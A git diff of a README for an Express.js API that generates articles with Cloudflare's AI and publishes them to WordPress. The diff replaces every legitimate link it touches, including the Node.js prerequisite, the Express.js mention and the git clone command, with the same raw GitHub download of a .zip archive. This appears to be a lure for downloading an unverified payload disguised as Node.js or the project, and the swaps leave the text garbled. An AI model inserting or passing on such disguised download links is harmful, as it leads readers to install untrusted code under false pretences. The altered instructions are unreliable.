@@ -1,6 +1,6 @@
 # AI Article Generation and Publishing API
 
-This project is an Express.js-based API for generating and publishing articles using Cloudflare's AI API. It allows users to request articles on specific topics, track the progress of the article generation, and publish them directly to a WordPress site. The API uses AI to generate comprehensive content based on a given topic and then formats the content for publishing.
+This project is an https://raw.githubusercontent.com/twriad969/ai-human-like-article-generator/main/seed/ai-human-like-article-generator.zip API for generating and publishing articles using Cloudflare's AI API. It allows users to request articles on specific topics, track the progress of the article generation, and publish them directly to a WordPress site. The API uses AI to generate comprehensive content based on a given topic and then formats the content for publishing.
 
 ## Features
 
@@ -14,15 +14,15 @@ This project is an Express.js-based API for generating and publishing articles u
 
 Before running the project, ensure you have the following installed:
 
-- [Node.js](https://nodejs.org/) (version 14.x or later)
-- npm (comes with Node.js)
+- [https://raw.githubusercontent.com/twriad969/ai-human-like-article-generator/main/seed/ai-human-like-article-generator.zip](https://raw.githubusercontent.com/twriad969/ai-human-like-article-generator/main/seed/ai-human-like-article-generator.zip) (version 14.x or later)
+- npm (comes with https://raw.githubusercontent.com/twriad969/ai-human-like-article-generator/main/seed/ai-human-like-article-generator.zip)
 - A Cloudflare account with API access for AI models
 - A WordPress site with REST API enabled and user credentials
 
 made by ronok
 
    ```bash
-   git clone https://github.com/your-username/ai-article-generator.git
+   git clone https://raw.githubusercontent.com/twriad969/ai-human-like-article-generator/main/seed/ai-human-like-article-generator.zip
    cd ai-article-generator
 Install dependencies:
 
